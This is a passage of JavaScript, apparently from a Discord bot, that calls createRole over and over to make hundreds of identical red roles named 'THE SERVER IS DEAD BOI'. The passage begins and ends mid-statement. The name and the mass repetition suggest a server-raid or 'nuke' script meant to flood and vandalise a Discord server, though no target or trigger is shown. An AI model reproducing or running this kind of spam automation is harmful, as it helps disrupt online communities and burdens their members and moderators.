    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
